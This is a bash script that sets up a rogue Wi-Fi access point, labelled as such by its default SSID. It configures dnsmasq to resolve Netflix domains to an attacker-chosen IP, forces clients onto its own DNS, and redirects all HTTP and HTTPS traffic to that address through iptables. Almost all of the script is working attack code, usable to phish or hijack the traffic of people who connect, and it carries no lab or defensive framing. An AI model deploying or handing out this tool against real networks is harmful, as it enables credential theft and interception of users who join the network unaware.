#!/bin/bash

# ensure user is logged in as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit
fi

# default env vars
INTERFACE="wlan0"
SSID="DEFAULT_ROGUE_AP"
IP_RANGE="192.168.50.1/24"
INTERNET_IFACE="eth0"
IP_REDIRECTION=192.168.50.1 # 157.240.3.35 => facebook by default

# if user choosed a custom ssid => overwrite the default one
while getopts "s:i:" opt; do
  case $opt in
    s) SSID="$OPTARG";;
    i)
      if [ -z "$OPTARG" ]; then
        echo "Error: -i option requires an IP address" >&2
        exit 1
      fi
      IP_REDIRECTION="$OPTARG"
      ;;
    \?) echo "Invalid option -$OPTARG" >&2; exit 1;;
  esac
done

# ensure needed packages are installed (hostapd & dnsmasq)
if ! command -v hostapd &> /dev/null; then
  echo "hostapd not found, installing..."
  apt update && apt install -y hostapd
fi

if ! command -v dnsmasq &> /dev/null; then
  echo "dnsmasq not found, installing..."
  apt update && apt install -y dnsmasq
fi

# stop already running services and unmask them
systemctl stop hostapd
systemctl stop dnsmasq
systemctl unmask hostapd
systemctl unmask dnsmasq

# configure network interface

ip link set $INTERFACE down
ip addr flush dev $INTERFACE
ip addr add 192.168.50.1/24 dev $INTERFACE
ip link set $INTERFACE up

# install dnsmasq if package is missing
if ! command -v dnsmasq &> /dev/null; then
  echo "dnsmasq not found, installing..."
  apt update && apt install -y dnsmasq
fi

echo "redirect to $IP_REDIRECTION..."
# configure dnsmasq with custom dns entries
cat > /etc/dnsmasq.conf <<EOF
interface=$INTERFACE
dhcp-range=192.168.50.10,192.168.50.100,12h
# DNS redirections to redirection IP
address=/netflix.com/$IP_REDIRECTION
address=/www.netflix.com/$IP_REDIRECTION
address=/assets.netflix.com/$IP_REDIRECTION
address=/netflix.net/$IP_REDIRECTION
address=/nflximg.com/$IP_REDIRECTION
address=/nflximg.net/$IP_REDIRECTION
address=/nflxvideo.net/$IP_REDIRECTION
address=/nflxso.net/$IP_REDIRECTION
# Force clients to use our DNS
dhcp-option=6,192.168.50.1
EOF

# Clear any existing rules
iptables -F
iptables -t nat -F

# Your existing DNS rules
iptables -A FORWARD -i $INTERFACE -p udp --dport 53 -j DROP
iptables -A FORWARD -i $INTERFACE -p tcp --dport 53 -j DROP
iptables -t nat -A PREROUTING -i $INTERFACE -p udp --dport 53 -j REDIRECT --to-ports 53
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 53 -j REDIRECT --to-ports 53

# HTTP/HTTPS redirection
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j DNAT --to-destination $IP_REDIRECTION:80
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j DNAT --to-destination $IP_REDIRECTION:443
iptables -t nat -A POSTROUTING -j MASQUERADE

# hostpad conf
cat > /etc/hostapd/hostapd.conf <<EOF
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=7
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

systemctl restart dnsmasq

# start needed services (with error checking)
systemctl unmask hostapd
systemctl unmask dnsmasq
systemctl enable hostapd || echo "Warning: Failed to enable hostapd"
systemctl enable dnsmasq || echo "Warning: Failed to enable dnsmasq"
systemctl start dnsmasq || echo "Warning: Failed to start dnsmasq"
systemctl start hostapd || echo "Warning: Failed to start hostapd"

# launch ip forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# set up NAT with iptables
iptables -t nat -A POSTROUTING -o $INTERNET_IFACE -j MASQUERADE
iptables -A FORWARD -i $INTERNET_IFACE -o $INTERFACE -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $INTERFACE -o $INTERNET_IFACE -j ACCEPT

# show result on console
echo "Access Point '$SSID' created on interface $INTERFACE with internet access"